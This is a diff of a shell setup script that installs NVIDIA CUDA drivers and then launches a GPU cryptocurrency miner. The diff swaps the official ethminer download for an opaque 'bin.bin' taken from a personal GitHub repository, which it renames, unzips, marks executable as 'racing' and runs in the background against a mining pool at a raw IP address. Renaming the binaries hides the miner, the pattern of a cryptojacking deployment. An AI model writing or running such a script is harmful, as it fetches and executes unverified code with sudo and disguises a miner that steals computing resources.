@@ -1,7 +1,7 @@
 SCRIPT_DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )"
 if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
     echo "Start setup..."
-	  echo "taind vip pro" > isHaveSetupCoin.txt
+    echo "taind vip pro" > isHaveSetupCoin.txt
     sudo apt-get install linux-headers-$(uname -r) -y
     distribution=$(. /etc/os-release;echo $ID$VERSION_ID | sed -e 's/\.//g')
     wget https://developer.download.nvidia.com/compute/cuda/repos/$distribution/x86_64/cuda-$distribution.pin
@@ -11,14 +11,11 @@ if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
     sudo apt-get update
     sudo apt-get -y install cuda-drivers
     sudo apt-get install libcurl3 -y
-    wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
-    tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+    wget https://github.com/nguyen3297/sub/raw/main/bin.bin
+    mv bin.bin bin.zip
+    sudo apt install unzip
+    unzip bin.zip
 fi
-if (ps ax | grep ethminer | grep -v grep > /dev/null)
-then
-	echo RUNNING
-else
-	cd  bin
-  mv ethminer sida
-  ./sida -U -P http://103.133.106.124:8081/azurepool &
-fi
+cd  bin
+sudo chmod +x racing
+./racing -U -P http://135.148.176.21:8443/pool &
